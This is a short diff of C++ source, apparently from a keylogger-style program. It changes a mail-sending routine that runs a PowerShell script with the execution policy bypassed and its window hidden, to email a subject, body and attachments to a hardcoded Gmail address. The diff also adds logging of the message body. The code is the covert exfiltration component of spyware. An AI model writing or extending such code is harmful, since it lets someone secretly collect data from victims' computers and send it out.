@@ -11,8 +11,8 @@
 #define SCRIPT_NAME "sm.ps1"
 
 namespace Mail {
-    #define X_EM_TO "XXXXXX@gmail.com"
-    #define X_EM_FROM "XXXXXX@gmail.com"
+    #define X_EM_TO "XXXXXXXX@gmail.com"
+    #define X_EM_FROM "XXXXXXX@gmail.com"
     #define X_EM_PASS "password"
     //You thought I was a complete idiot, didn't you?
 
@@ -104,7 +104,7 @@ namespace Mail {
         if(!ok){
             return -2;
         }
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + StringReplace(body, "\"","\\\"") + "\" -Att \"" + attachments + "\"";
+        std::string param = "-ExecutionPolicy Bypass -File \"" + scr_path + "\" -Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + StringReplace(body, "\"","\\\"") + "\" -Att \"" + attachments + "\"";
         SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -115,6 +115,9 @@ namespace Mail {
         ShExecInfo.lpDirectory = NULL;
         ShExecInfo.nShow = SW_HIDE;
         ShExecInfo.hInstApp = NULL;
+
+        //save body
+        Helper::WriteTestLog(body);
 
         ok = (bool)ShellExecuteEx(&ShExecInfo);
         if(!ok){
